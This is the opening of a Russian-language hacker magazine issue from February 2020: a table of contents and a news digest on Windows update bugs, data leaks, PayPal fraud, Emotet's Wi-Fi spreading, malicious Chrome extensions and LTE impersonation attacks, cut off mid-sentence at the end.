
                                                Февраль 2020
            № 251
CONTENTS

    MEGANews
  Всё новое за последний месяц

     Android
  Security-новшества Android 11 и нативная версия тро яна Joker

    Как укрепить «Веру»
  Делаем шиф рован ные кон тейнеры VeraCrypt неприступными

    Волк в овечь ей шкуре
  Создаем под дель ную точку дос тупа на ESP8266 для сбора паролей

    Разбираем REvil
  Как извес тный шиф роваль щик прячет вызовы WinAPI

   Железный занавес
  Как производите ли меша ют взла мывать гаджеты

    Слабое зве но
  Как пра вильно исполь зовать фишин говые рассылки в рамках пентеста

    Вирус для Windows
  Создаем прос тейшую вредонос ную программу на ассемблере

    Фун дамен тальные осно вы хакерства
  Иден тифика ция ключевых структур языков высокого уровня

    DDoS на Bluetooth
  Разбира ем трюк, который поможет отключить чужую колон ку

    Дь яволь ски-красный пен тест
  Строим цепочки тун нелей через докер-кон тей неры на вир туалке с Hack The Box

    Hack the web!
  Как проверить сайт на уязвимос ти и как их экс плуатируют

    Сол нечный удар
  Разбира ем две опасные уязвимос ти в Apache Solr

   Дырявые дис ки
  Почему не сто ит полагать ся на шиф рование средства ми NAS

    Швейцар ская ненадежность
  Как американ ская разведка внед рила уязвимости в шиф ры ком пании Crypto AG

   Шабаш шаблонов
  Превращаем GCC в макет ную пла ту с помощью шаблонов С++

    Immutable
  Постига ем хитрости неизменяемых струк тур дан ных в функциональных языках

    Защищаем MikroTik
  Хитрости безопас ной нас трой ки роутера

    Ламповый сигнал
  Со бира ем FM-радиоприемник на лампах

    Как погрузиться в VR
  Боль шой гайд по шлемам вир туальной реальности

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ПРОБЛЕМЫ
ОБНОВЛЕНИЙ
MICROSOFT
В последнее время у пользователей воз ника ет множество проблем из‐за
обновлений, выпущен ных компанией Microsoft.


Не отключаемый компьютер
В начале фев раля проблемы воз никли у пользователей Windows 7. По сути,
после релиза финального обновления для этой ОС, вышедшего в январе
текущего года, у поль зователей Windows 7 вообще перестали выключаться
и перезагружаться компьютеры. При попытке выключить ПК люди видели
сообщение: You don’t have permission to shut down this computer («У вас нет
прав для выключения этого компь ютера»).
  Напомню, что в янва ре, пос ле релиза обновления KB4534310, некоторые
пользователи также заметили, что у них с рабочего стола пропали обои,
а вместо них виден только черный экран. Как выяс нилось, проблема была
связана с опцией Stretch («Рас тянуть»), которую можно найти в настройках
рабочего стола. К счастью, на днях, невзирая на официальное прекращение
поддержки ОС, разработчики Microsoft все же выпус тили патч для этой ошиб‐
ки (KB4539602), хотя изна чально предполага лось, что исправление будет
доступно только тем клиентам, которые оплатили расширенную поддержку
(Extended Security Updates, ESU).
  Но если баг с обоями на рабочем столе был вполне безобидным, то новая
ошибка доставила поль зователям куда больше неудобств. Более того, с этой
же проблемой чуть позже столкну лись и пользователи Windows 10.
   Хотя представители Microsoft еще не делали публичных заявлений об этих
багах, ранее в компании сооб щали, что занима ются расследованием про‐
исходящего. Также на официальных форумах Microsoft был замечен инте рес‐
ный ответ от сотрудника компании, который писал, что проблему удалось
проследить до недавнего обновления Adobe Genuine, которое разработчики
Adobe спешно откатили через авто матичес кое обновление. Пользователей,
у которых баг все равно сохранился, успокаива ли, что ошиб ка вскоре будет
устранена (опять же с помощью автоматичес кого обновления).
  Интересно, что в начале февраля некоторые поль зователи тоже утвержда‐
ли, будто проблемы с выключением Windows 7 связаны с недавним обновле‐
нием Adobe и отклю чение этих Windows‐служб реша ет вопрос.
   Теперь, когда Adobe отка тила проблемное обновление, у пользователей
Windows 7 все дол жно зарабо тать как нужно, но вот пользовате лям Windows
10 повезло меньше: в их случае баг пока не был признан и исправлений
от Adobe или Microsoft нет. В качестве временного способа решения проб‐
лемы можно отклю чить службы Adobe Genuine Monitor, Adobe Genuine Soft‐
ware Integrity и Adobe Update services.


Удалите это обновле ние
Также что‐то пошло не так с обновлением KB4524244, вышедшим в рамках
февральского втор ника обновлений. Оно вызывает зависания, проблемы
с загрузкой и установкой. В частнос ти, по данным издания Bleeping Computer,
проблемы наблюдаются у пользователей устройств HP и Apple.
  Обновление KB4524244 предназна чалось для  всех версий Windows
10 между 1607 и 1909, а также Windows Server и дол жно было исправить
проблему в сторонних Uniﬁed Extensible Firmware Interface (UEFI) и диспетчере
загрузки, которые могли подвергать машины с UEFI риску.
  Однако при установке обновления многие пользователи обнаружили
проблемы: у некоторых система переставала отвечать и демонстрировать
что‐либо, кроме экрана BIOS; у дру гих обновление не устанавливалось и воз‐
никала ошибка 0x800f0922; у треть их KB4524244 все же установилось,
но после этого начались пос тоянные зависа ния, работать из‐за которых ста‐
ло невозможно.
   Разработчики Microsoft признали, что проб лема действительно существу‐
ет и она серьезная. В настоящее время KB4524244 было удалено из Windows
Update, Windows Server Update Services (WSUS) и Microsoft Update Catalog,
а для пострадав ших пользователей были опубликованы инс трукции, как вос‐
становить работоспособность их системы. Фактически рекомендации раз‐
работчиков  Microsoft  сводятся  к  уда лению  KB4524244. Доработанную
и исправленную вер сию обновления обещают представить в ближайшее вре‐
мя.


Исчезнувшие файлы
Еще один опасный февральский апдейт — KB4532693. После его установки
некоторые пользователи Windows 10 лишились своих файлов. Их рабочий
стол и меню «Пуск» оказались сброшены к настройкам по умолчанию, а хра‐
нящиеся в профиле файлы вооб ще пропали.
  Дело в том, что во время установки обновления пользователей перек‐
лючают на временный профиль, а резервная копия исходного профиля сох‐
раняется с расширением .000 или .bak. Одна ко из‐за бага восстановление
обычного пользователя пос ле обновления не про исходит. В итоге поль‐
зователи пришли к выводу, что решить эту проб лему и вернуть свой профиль
можно, несколько  раз переза пус тив Windows или  удалив проблемное
обновление.
  Однако оказалось, что проб лемы простираются дальше восстановления
профилей. По информации Windows Latest, а также судя по жалобам поль‐
зователей на официальных форумах Microsoft и в социальных сетях, порой
пользовательские профиль и файлы из каталогов Documents, Downloads, Mu‐
sic, Pictures и Videos вообще исчезают из системы пол ностью, так что при‐
ходится восстанавливать удаленную информацию из резервных копий, если
они есть.
  Представите ли  Microsoft крат ко сооб щили, что им извес тно о баге
с бэкапом профилей и по это му вопросу уже проводится рас следование,
а вот полное удаление данных пока не про комменти ровали.
  Возможные способы восстановления данных мы перечис лили здесь.


4 000 000 РУБЛЕЙ ШТРА ФА

13 февраля 2020 года мировой суд Таганского района Москвы оштрафовал на 4 000 000 руб‐
лей компании Facebook и Twitter.


Это итог многолетнего противостояния компаний и Рос комнадзора: штраф был наложен из‐за
нарушения российского законодательства о защите персональных данных в рамках ч. 8 ст.
13.11 Кодек са об административных правонарушениях — «Наруше ние законо дательства Рос‐
сийской Федерации в области персональных данных». То есть за невыполнение пре дусмотрен‐
ной законодательством РФ обязан ности при сборе персональ ных данных, в том чис ле пос редс‐
твом интернета, записывать, систематизировать, накапливать и хранить персональные дан ные
россиян с использованием баз, находящихся на тер ритории Рос сии.





БАГ В PAYPAL
В конце фев раля СМИ обратили внимание, что поль зователи со всего мира
начали массово жаловаться на несанкционированные платежи через их акка‐
унты PayPal.
  Описанные жертвами инциденты очень похожи: злоумышленники исполь‐
зуют Google Pay, чтобы покупать товары, а для оплаты используют связанные
аккаунты PayPal. Судя по скриншотам и раз личным свидетельствам, боль‐
шинство таких нелегальных транзакций выпол няется через американские
магазины (чаще всего сети Target).





Большинство пострадавших от этих атак находятся в Германии. Если опи‐
раться на открытые источники, можно предположить, что нанесенный поль‐
зователям ущерб уже исчисляется десятками тысяч евро: хакеры, как пра‐
вило, начинают с тестовых пла тежей в раз мере от 0,01 до 4 евро, а затем
берутся за дело серь езно, и в ито ге некоторые транзакции превыша‐
ют 1000 евро.
   Какую именно проб лему эксплуатируют злоумышленники — пока неяс но.
Немецкий ИБ‐эксперт Маркус Фен ске (Markus Fenske) предполагает в Twitter,
что хакеры используют баг, о котором компанию PayPal еще год назад пре‐
дупреждал иссле дователь Андреас Май ер (Andreas Mayer). Дело в том, что,
когда учетную запись PayPal свя зывают с учет ной записью Google Pay, PayPal
создает для этого вир туальную карту с собственным номером, сроком дей‐
ствия и кодом CVC. Когда пользователь Google Pay расплачивается бес‐
контактно, используя счет PayPal, средс тва снимают ся с этой виртуальной
карты.
  Фенске объясняет, что такие карты не ограничены исключительно PoS‐
транзакциями и могут использоваться для опла ты в онлайне. Судя по всему,
злоумышленники нашли способ получать данные этих виртуальных карт
и теперь используют их для несанкционированных транзакций. По мне нию
эксперта, вероятно, для это го хватило бы обычного перебора и брутфорса.
Но есть и другие варианты:



       «PayPal раз реша ет бес контак тные пла тежи через Google Pay. Если вы
      их нас троили, можно считать данные вир туальной кре дитной кар ты
      с телефона, если мобильное устройство вклю чено. Без аутентифика-
      ции. То есть любой человек, находящийся рядом с вашим телефоном,
     име ет  вир туальную  кре дитную  кар ту,  которая  снимает  деньги
      с вашего сче та PayPal. И нет никаких огра ниче ний по количес тву
      или пра вомоч ности пла тежей», — говорит Фенске.

Представители PayPal пока не дают официальных комментариев и лишь уве‐
ряют, что расследование происходящего уже ведется.


СТРАСТИ ВОК РУГ WINDOWS 7
Представители Фонда свободного програм много обес печения (Free Software Foundation, FSF)
сообщили, что их петицию, которая призывала ком панию Microsoft сделать Windows 7 свобод‐
ным ПО и открыть ее исходные коды, поддержало множество людей. Теперь, продол жая свою
акцию, FSF направил разработчикам Microsoft чис тый жесткий диск и собранные в ходе кам‐
пании подписи.





→«Microsoft может освободить Windows. У них есть все необходимые юридичес кие права
или рычаги, нужные для их получения. Независимо от того, сделают они это или нет, решать
только им. В последние недели мы дали им понять, что тысячи людей во всем мире хотят, что‐
бы Windows была свободной. Теперь мы дадим им средство.
  Мы хотим, чтобы они продемонстрировали, как сильно любят ПО с открытым исходным
кодом, которое часто упоминают в своей рекламе. Если они действительно любят свободное
ПО (и мы готовы поверить им), у них есть возможность показать это миру. Наде емся, что они
не просто извлекают выгоду из модели разработки свободного ПО самым поверхностным
и эксплуататорским из воз можных способов: используя ее в качестве маркетингового инстру‐
мента, чтобы заставить нас считать, будто они заботятся о нашей свободе»
— представители FSF





УТЕЧКИ ФЕВРАЛЯ
Уже давно ни один месяц не обходится без утечек данных. Перечислим
наиболее заметные инциденты пос леднего времени.


МФО
В начале месяца СМИ сообщили, что в Сети была выставлена на продажу
база клиентов мик рофинансовых организаций (МФО), содержащая дан‐
ные 1,2 миллиона человек. В рас поряжении журналистов РБК оказался
«пробник» этого дампа, содержащий около 800 записей: фамилии, имена,
отчества, номера телефонов, адреса электронной почты, даты рождения
и паспортные данные.
   Хотя продавец базы не раскрывал наз ваний конкретных МФО, большинс‐
тво пользователей, ответивших на звонки журналис тов РБК, сообщили, что
обращались за кредита ми в компанию «Быстроденьги». Также «пробник»
содержал данные клиентов компаний «Займер», «еКапуста», «Лайм» и «Мик‐
роклад». Все они  пользовались  услугами МФО  в период  с  2017‐го
по конец 2019 года. Часть телефонных номеров в базе оказались уже неак‐
туальны (не обслуживаются или сменили владельца). Некоторые пользовате‐
ли сказали, что их данные верны, но они никогда не обращались в МФО.
  Представите ли «Быстроденег» сравнили примерно 100 записей с собс‐
твенной базой и сооб щили, что уро вень совпадения по строкам составля‐
ет 33%, но не по всем параметрам. «Например, совпадают фамилия, имя,
отчество, но номер телефона отличается от указанного в нашей сис теме», —
прокомментировал Антон Грунтов, директор по безопасности группы ком‐
паний Eqvanta (в нее входят «Быстроденьги»).
  В свою очередь, МФК «Займер» начала оперативное слу жебное рассле‐
дование в связи с возможной утечкой персональ ных данных клиентов. Пред‐
варительные результаты показа ли, что утечки персональных данных из базы
клиентов МФК  не  происходило,  однако,  как  сообщили  журналистам,
руководство ком пании обратилось в пра воохранительные органы. В «Мик‐
рокладе» заявили, что в пробной час ти дампа не было данных ее клиентов.
Остальные круп ные МФО не ответили на запросы РБК.
  Собственный источник, близкий к ЦБ, сообщил журналис там, что продава‐
емая база похожа на объединение данных клиентов МФО из раз ных источни‐
ков, а не на утечку из одной конкретной компании.
   Грунтов считает, что база данных не может принадлежать МФО или бан‐
кам из‐за ее непригодности для работы, так как там есть поля, которые
содержат только номер телефо на и почту. По его мнению, источником этих
данных могут быть веб‐мас тера или лидогенера торы, которые собирают дан‐
ные клиентов для дальнейшей перепродажи. Предста вители «Займера» также
пришли к выводу, что источником утечки могла быть БД компаний‐партнеров,
которые собирают в интернете заявки на кредиты и продают их МФО. Кроме
того, там предположили, что дамп может представлять собой составную базу
данных клиентов несколь ких уже не функционирующих МФО.


Сбербанк
Журналисты «Известий» обна ружили в даркнете сразу два дампа с данными
пользователей Сбер банка: на 20 тысяч и 100 тысяч строк. Журналис ты про‐
верили тестовый фрагмент первой базы (десять записей) и удостовери лись
в подлинности информации. Анализ показал, что сведения не совпадают
с ранее выставленными на продажу, то есть утечка новая.
  По словам продавца, он готов выгружать по 10 тысяч новых записей еже‐
недельно и продавать каждую строку по 35 рублей. По его словам, граждане
из базы проживают в регионах с часовым поясом +5 UTC, то есть в субъектах
Уральского и Приволжского федеральных окру гов.
  Каждая запись в БД содержит наз вание банковского подразделения, пол‐
ные фамилию, имя, отчес тво, номер счета, паспортные данные, даты рож‐
дения и телефоны пользователей. Судя по сокращенному названию под‐
разделения, клиенты получили карты в Рес публи ке Башкортостан. Серия пас‐
порта сов падает с кодовым номером (ОКАТО) региона.
   Чтобы убедиться в подлинности данных, журналис ты проверя ли мобиль‐
ные телефоны через приложение «Сбербанк Онлайн», где при вве дении
номера можно увидеть имя, отчество и первую букву фамилии пользователя.
Шесть из десяти записей совпали, еще три ока зались не привязаны к при‐
ложению, и в одном случае телефон продемонс трировал дру гое имя. По ука‐
занным номерам телефонов удалось доз вонить ся до четырех человек, все
они подтвердили свое имя и дату рождения.
   Как сообщили предста вители Сбербанка, они уже провели проверку
и пришли к выводу, что найденные журналистами данные продаются на чер‐
ном рынке давно и отно сятся к 2015–2016 годам.



      «Ежед невно в Сети появ ляются десятки сообщений с пред ложением
      продать базы данных клиентов раз личных банков и ком паний. Мы про-
      веряем любую подобную информа цию, в том чис ле и ту, о которой
      идет речь в публикации. Там есть данные, ранее уже пред лагав шиеся
       к продаже на теневом рынке и относящиеся к 2015–2016 годам», —
      заявили в пресс‑службе банка.


Из раильские избирате ли
Из‐за проблемы, связанной с приложением израильской партии «Ликуд»,
в которой состоит израильский премьер‐министр Биньямин Нетаньяху, могла
произойти утечка данных 6,5 миллиона человек.
  Проблему заметил разработ чик из компании Verizon Media Ран Бар‐Зик
(Ran Bar‐Zik). Пока неясно, успел ли кто‐либо обнаружить брешь до Бар‐Зика
и были ли на самом деле скомпрометированы данные пользователей. Как бы
то ни было, местные СМИ, включая Haaretz, Calcalist и Ynet, подтвердили
выводы исследователя.
  В своем блоге Бар‐Зик пишет, что сайт приложения содержал больше
информации, чем нужно. Так, в исходном коде обнаружилась ссылка на API‐
эндпойнт, который дол жен был использоваться для аутентификации админис‐
траторов ресурса. Увы, раз работчики сайта оставили эндпойнт открытым,
без пароля, то есть вос пользовать ся их упущением мог любой желающий,
без каких‐либо ограничений (двухфакторной аутентификации предус мотрено
также не было). Отправка запросов к этому API‐эндпойнту возвращала дан‐
ные об администраторах сайта, включая их пароли открытым текстом.
  Иссле дователь восполь зовался этими учет ными данными и получил дос‐
туп к бэкенду сайта. Там Бар‐Зик обнаружил базу данных, содержащую лич‐
ные данные 6 453 254 изра иль ских граждан, имеющих право голоса на пред‐
стоящих выборах.





Местная пресса утверждает, что эта БД — копия официальной израильской
базы данных зарегистрированных избирателей, которую каждая политичес‐
кая партия получает перед выбора ми, чтобы подготовить предстоящие кам‐
пании. Так, по данным изда ния Haaretz, в БД содержатся полные име на,
номера телефонов, номера удостоверений личности, домашние адре са, пол,
возраст и данные о политичес ких предпочтениях граждан.
  В настоящее время сайт приложения Electoral был удален и уже пропал
даже из кеша поисковых систем, включая Google и Bing, чтобы предотвратить
возможные злоупотребления обна руженным багом.


Гости оте лей MGM
Издание ZDNet совместно со специалистами Under the Breach обнаружили
утечку личных данных более 10,6 миллиона человек, которые останав‐
ливались в отелях MGM Resorts. Информация была опубликована на неназ‐
ванном хакерском форуме.
   Утечка включает в себя не только информа цию об обычных туристах
и путешественниках, но также личные и контактные данные знаменитостей,
глав крупных компаний, журналис тов, правительственных чиновников и сот‐
рудников ряда крупнейших технологических компаний мира.
  По данным экспертов, в целом дамп MGM содержит личные дан‐
ные 10 683 188 бывших гостей отелей. В том чис ле и такие личные данные,
как полные имена, домашние адреса, номера телефонов, email‐адреса
и даты рождения.
   Чтобы проверить подлинность дампа, журналисты связались с экс‐пос‐
тояльцами и выяснили, что те действитель но оста навливались в отелях MGM,
сверили даты их визитов и личные данные. Совпадение подтвердили меж‐
дународные путешественники, журналисты, посещавшие технические кон‐
ференции,  руководители компаний, приезжавшие на деловые  встречи,
и даже правительственные чиновники.
  Проверив данные, исследователи обра тились за комментарием к MGM
Resorts. Команда MGM Resorts смогла оперативно проверить информацию
об утечке и проследить ее до прошлогоднего инцидента с безопасностью.
Так, представители сети отелей сообщили, что еще летом 2019 года был
выявлен несанкционированный доступ к облачному серверу, который содер‐
жал часть данных о посетителях отелей. В компании под черкнули, что никаких
финансовых и учетных данных среди этой информации не было.
   Сеть оте лей заявляет, что еще в прошлом году уведомила всех пострадав‐
ших в соответствии с действующим законо датель ством штата, а также прив‐
лекла к расследованию случившегося две независимые криминалис тичес кие
компании, специализиру ющиеся на киберин цидентах.
   Также в MGM Resorts подчеркивают, что дамп содержит довольно старые
данные. Журналисты сообщают, что это правда: никто из гостей, с которыми
связывалось издание, не оста навливался в отелях MGM после 2017 года,
а некоторые из телефонных номеров уже были отклю чены.


ЛЮБИМЫЕ БРЕНДЫ ФИШЕРОВ

Эксперты израильской компании Check Point опубликовали отчет о брендах, которые наибо лее
часто используют злоумышленники в фишинговых кампаниях.


В течение четвертого квартала 2019 года исследователи внимательно наблюдали за различи‐
ями в распространении фишин говых страниц. К примеру, через мобильные устройства
в основном распространялись фишинговые страницы социальных сетей и банков, а через элек‐
тронную почту, как правило, фишинговые письма, приурочен ные к сезону распродаж.

Наиболее популярными среди злоумышленников брен дами оказались Facebook (18% от обще‐
го количества фишинговых атак), Yahoo (10%), Netﬂix (5%), PayPal (5%), Microsoft (3%), Spoti‐
fy (3%), Apple (2%), Google (2%), Chase (2%) и Ray‐Ban (2%).

На фишинговые email пришлось 27% от всех атак, и чаще всего злоумышленники имитиро вали
в них компании Yahoo!, Ray-Ban Sunglasses, Microsoft, Dropbox.

Самым популярным способом фишин га остаются сайты (48% от всех атак). Такие вре донос‐
ные ресурсы чаще всего подделываются под Spotify, Microsoft, PayPal и Facebook.

Через мобильные устрой ства происходит 25% фишинговых атак, и в таких случаях хакеры
обычно притворяются Chase Mobile Banking, Facebook, Apple и PayPal.





                                     Продолжение статьи →
← Начало статьи





 EMOTET И WI‐FI
  Аналитики компании Binary Defense заметили, что новая версия трояна
  Emotet ведет себя как Wi‐Fi‐червь, то есть пыта ется распространяться
  и заражать новых жертв через дос тупные поб лизос ти сети Wi‐Fi.


               INFO

                          •Emotet — один из наибо лее активных в нас‐
                          тоящее время троянов, который распростра‐
                             няется с почтовым спамом, через вредоносные
                           документы  Word.  Такие  письма  могут  мас‐
                            кироваться под инвойсы, накладные, предуп‐
                          реждения  о  безопасности  аккаунта,  приг‐
                          лашения на вечеринку и даже под информацию
                          о распространении коронавируса.
                       •Проникнув в систему жертвы, Emotet исполь‐
                              зует зараженную машину для дальнейшей рас‐
                           сылки спама, а также устанавливает на устрой‐
                             ство   дополнительную  малварь.   Зачастую
                             это банкер Trickbot (который ворует учет ные
                           данные, cookie, историю браузера, ключи SSH
                          и так далее), а так же шифровальщик Ryuk.


  Исследователи рассказывают, что для обна ружения ближайших Wi‐Fi‐сетей
  мал варь задействует wlanAPI.dll на уже зараженной машине. Обнаружив дос‐
  тупную сеть, Emotet пытается брутфорсом подоб рать учетные данные, чтобы
  проникнуть в нее. В случае успеха малварь ищет в новой сети любые Win‐
  dows‐машины, которые тоже можно заразить.
     Все аккаунты на таких потенциально доступных устройствах сканируются,
  и вредонос пытается при помощи брутфорса про никнуть в учетные записи
  администратора и других пользователей. Если взлом удался, Emotet дос‐
   тавляет на машину полезную наг рузку в виде файла service.exe и создает
  службу Windows Defender System Service, чтобы надежно закрепиться в сис‐
   теме.
     Для заражения других устройств через Wi‐Fi троян, в чис ле прочего,
  использует бинарник worm.exe, изу ченный обра зец которого был датирован
  апрелем 2018 года. Он содержал жес тко закодированный IP‐адрес управля‐
  ющего сервера, ранее уже замеченного в связи с Emotet. Эксперты пишут,
   что это позволяет предположить, что рас простра нение через Wi‐Fi исполь‐
  зовалось малварью и оста валось незамеченным на протяже нии почти двух
   лет.





  Исследователи полагают, что отчасти это может быть связано с тем, как ред‐
   ко используется этот бинарник. Так, впервые он был обнаружен специалис‐
  тами 23 января 2020 года, хотя Binary Defense пристально наблюдала за дей‐
   ствиями Emotet с августа 2019 года, когда малварь вернулась к активной
  деятельности после перерыва. Вероятно, компонент червя вообще не при‐
  меняется, если малварь понимает, что имеет дело с виртуальной машиной
  или работает в песочнице.
    Еще один исполняемый файл, который тро ян использует для рас простра‐
  нения через Wi‐Fi, — это service.exe. Он тоже имеет любопытную особен‐
   ность: хотя он исполь зует порт 443 Transport Layer Security (TLS) для связи
  с управляющим сервером, по сути, подключение идет по незашифрованному
   HTTP.
     Аналитики Binary Defense рекомендуют использовать надежные пароли
  для защиты беспроводных сетей, чтобы подобная Emotet мал варь не могла
  с легкостью про ник нуть в сеть.


  5,7 МИЛ ЛИАР ДА РУБЛЕЙ


   Первый заместитель директора департамента ИБ Бан ка Рос сии Артём Сычёв представил отчет
   об операциях за 2019 год, совершенных без сог ласия клиентов. По данным отче та, за год
   преступники похитили у кли ентов кре дитных организаций 5,7 миллиарда рублей и выпол нили
   572 000 операций.

  В 70% случаев причиной краж стала социаль ная инженерия, то есть мошен ники вынуждали
   пользователей сообщить данные платежной карты, персональ ную информацию, коды под‐
   тверждения и так далее. Средняя стоимость хищения составила 10 000 рублей.

   По словам Сычёва, в 2019 году банки вернули пос традавшим 0,9 миллиарда рублей.





 БОЛЬШАЯ ЗАЧИСТКА
  По итогам двухмесячного рас следова ния, про веденного специалис тами Cis‐
  co Duo Security, из Chrome Web Store были удалены более 500 вре доносных
  расширений, которые внедряли рекламу в браузеры ничего не подозрева‐
  ющих пользователей.
     Вредоносный код расширений акти виро вал ся лишь при определенных
  условиях и перенаправлял пользователей на конкретные сай ты. В некоторых
   случаях это могла быть партнерская ссылка на легитимный ресурс (такой
   как Macy’s, Dell или Best Buy), но в дру гих ссылка могла оказаться вредонос‐
   ной, например вела на фишинговую стра ницу или сайт, где предлагалось заг‐
   рузить малварь.
     Эти расширения были частью более крупной кампании, активной на про‐
  тяжении более двух лет. Предполага ется, что хак‐группа, стоящая за этой
  операцией, и вовсе может быть активна с начала 2010‐х годов.
     Вредоносные расширения были замечены в ходе рутинного поис ка угроз:
  специалисты Cisco Duo Security обратили внимание на вредоносные сай ты,
  имеющие общий шаблон URL. Исполь зуя сервис для анализа рас ширений
   CRXcavator, эксперты выявили начальный кластер рекламных расширений,
  которые были объединены почти идентичной кодовой базой и использовали
  безликие названия, не говорящие практически ничего об их предназначении.
     Заметив эти шаблоны, специалисты поняли, что име ют дело с масштабной
  вредоносной кампанией. Так, по данным Cisco Duo Security, общее количес‐
   тво установок пер вого набора этих рас ширений составило более 1,7 мил‐
   лиона. Теперь, когда собс твенное расследование провела и сама компания
   Google, обнаружилось, что это му шаблону соот ветс твуют в общей сложности
  более 500 расширений.
    Неясно, сколько пользователей уста новили эти вредоносные рас ширения,
   но, скорее всего, речь идет о нескольких миллионах пострадавших. Забанив
  расширения в официальном Chrome Web Store, инженеры Google также деак‐
  тивировали их в браузерах пользователей, пометив как «вредоносные», что‐
  бы пользователи удалили их и не активиро вали повторно.
     Кроме того, в этом месяце компания Google рассказала, как намерена
  бороться  со  злоупотреблениями  со  стороны  раз работчиков,  которые
  нарушают правила магазина приложений и показывают рекламу вне своих
  продуктов. Речь идет о рекламных объявлениях, которые исходят от одного
  приложения, но отображаются поверх дру гих при ложений или на домашнем
  экране устройства, из‐за чего пользователю совершенно неясно, откуда эта
  реклама вообще появилась.
     Для начала инженеры Google уже уда лили из Google Play Store 600 при‐
  ложений, нарушавших пра вила раз мещения рекламы, а также забанили их
  разработчиков, причем не только в самом магазине приложений, но и на рек‐
  ламных платформах Google AdMob и Google Ad Manager. Второе ограниче‐
   ние, по сути, запрещает раз работчикам монети зировать свои при ложения
  даже вне Play Store. По информа ции издания BuzzFeed, в чис ле забаненных
  оказалась компания Cheetah Mobile, один из крупнейших раз работчиков при‐
  ложений для Android в мире.
     Эксперты Google пишут, что на такие меры они пошли, когда узнали о ряде
  новых  методик,  которые  девело перы  при меня ют  в  последнее  вре мя
  для показа объявлений вне своих приложений. Для выявления подобных зло‐
   употреблений  был  разработан  «инновационный  подход,  основанный
  на машинном обучении».
     Также Google заявила, что пла ниру ет продолжать банить нарушителей
  и далее. Для это го был разработан трехэтапный план действий, который
   в целом должен сделать эко систему Play Store и Android более здоровой.
  В частности, компания собирается бороться с рекламой за пре делами при‐
  ложений (в том числе внося изменения в работу самой ОС Android, чтобы
  сделать такие зло употребления невоз можными), а также намерена опуб‐
   ликовать улучшенные инс трументы для раз работчика, с которы ми будет про‐
  ще соответствовать стандартам рекламной индустрии.


  ПРЕСТУПНОСТЬ И ПРОГРЕСС
  В своем Twitter Джон Макафи выдвинул интерес ную теорию: если преступники повсеместно
   используют анонимные крип товалюты (Monero, Zcash, Dash и другие) — это знаковое событие
    и, следовательно, вскоре весь мир ожидает широкое принятие таких токенов.





  →«Преступники используют анонимные крип товалюты. Прекрасно! Они всегда первыми
   используют любые ценные технологии. В 1930‐х это были более быс трые авто мобили для бегс‐
   тва [с мест преступления]. Затем телефоны для координации преступле ний. Влас ти всегда
   позади. Теперь они [преступники] доказали силу приватности. Слава Богу!»
  — Джон Макафи





 И СНОВА LTE
  Эксперты из Рурского университета сооб щили о проблеме IMP4GT (IMPer‐
   sonation Attacks in 4G NeTworks), которой подвержены практически все сов‐
  ременные устройства с поддержкой LTE, то есть смартфоны, планшеты, IoT‐
  девайсы. Баг позволя ет имитировать в сети оператора другого пользователя,
  а значит, злоумышленник смо жет оформлять плат ные подписки за счет других
  людей или публиковать что‐либо (к примеру, секретные документы) под чужой
   личиной.
    Ключевым элементом атак IMP4GT является software‐deﬁned radio (то есть
  для атаки злоумышленник должен находиться неподалеку от своей жертвы).
  Такое устройство способно перехватить сигналы между мобильным устрой‐
  ством и базовой станцией и, используя их, обмануть смартфон, выдав себя
  за базовую станцию, или, напротив, обмануть сеть, прикинувшись смартфо‐
  ном. Как только канал свя зи скомпромети рован, начинается манипулиро‐
  вание пакетами данных, которые циркулиру ют между устройством и базовой
   станцией.



        «Проблема в отсутс твии защиты целос тнос ти: пакеты данных между
        мобильным телефоном и базовой станцией переда ются в зашиф-
        рованном виде, что защища ет данные от прос лушива ния. Одна ко есть
         воз можность изме нить эти пакеты данных. Мы не зна ем, что находит-
         ся в пакете данных, но можем спровоцировать воз никновение ошибок,
        изме няя биты с 0 на 1 или с 1 на 0», — рас ска зыва ют экспер ты.

  В итоге такие баги могут заставить мобильное устройство и базовую станцию
  расшифровать или зашифровать сообщения, преобразовать информацию
   в простой текст или дать злоумышленнику воз можность отправлять команды
  без авторизации.
     Такие команды могут быть использованы для покупки платных подписок
  или бронирования услуг (когда счет оплачива ет кто‐то другой), но могут
  иметь и более  серьезные  последс твия. Нап ример,  атакующий может
  посещать сайты под видом дру гого человека и передавать информацию
   от чужого имени.
     Авторы исследования подчеркивают, что ата ки IMP4GT опасны и для
  некоторых 5G‐сетей. Уязвимость можно устранить в сетях 5G, внедрив обя‐
   зательную защиту целостнос ти на уровне поль зователя, но это потребует
  немалых затрат со стороны операторов связи (дополнительная защита будет
  генерировать большую переда чу данных, а базовым станциям необходимы
  изменения), а также замены существующих смартфо нов.


 ВДВОЕ БОЛЬШЕ DDOS‐АТАК

   По данным «Лаборатории Касперского», количество DDoS‐атак в четвертом квартале 2018 года
   составило 56% от числа атак, заблокированных в течение пос ледних трех месяцев 2019 года.
   То есть количество DDoS‐атак выросло почти вдвое.

   Хотя количество DDoS‐атак значительно увеличилось по сравнению с аналогичным периодом
   в 2018 году, рост относительно третьего квар тала 2019 года незначите лен: атаки в третьем
   квартале составили 92% от их числа в четвертом квартале.

   Заметно увеличилось число так называемых умных DDoS‐атак (атаки в третьем квартале сос‐
   тавили 73% от их числа в четвертом квартале). По словам аналитиков, подобный рост впол не
   предсказуем, поскольку ноябрь и декабрь традиционно время для большого количес тва
   онлайн‐продаж и расцвета розничной тор говли.





   При этом количество сверхдлин ных атак (свыше 400 часов) превысило показатели, которые
   эксперты успели зарегистрировать за всю историю наблюдений.

   Три самые долгие атаки продолжались больше 20 суток (494, 492 и 486 часов), что почти
   вдвое дольше лидера прошлого квар тала.

   Первое место по количеству атак вновь занял Китай, хотя его доля слегка понизилась (58,46%
   по сравнению с 62,97% в третьем квартале).

   Top‐3 стран по числу мишеней традиционно совпадает с лидерами по числу атак: это Китай
   (53,07%), США (22,01%) и Япония (6,14%).

   Среди типов атак по‐прежнему лидирует SYN-флуд (84,6%), доля атак через TCP про должила
   расти и превысила долю UDP-флуда, а ICMP-флуд показал значительный рост.





 ВЗЛОМ EQUIFAX
  Министерство юстиции США провело пресс‐конференцию, на которой были
  заочно предъявлены обвинения четырем гражданам Китая. Сообщается, что
  Ву Чжиюн, Ван Цянь, Сюй Ке и Лю Лэй имели прямое отношение к нашумев‐
  шей   атаке  на  бюро  кредит ных  исто рий   Equifax,  произошедшей
  летом 2017 года.





  О масштабной утечке данных, которую допус тило одно из крупнейших в мире
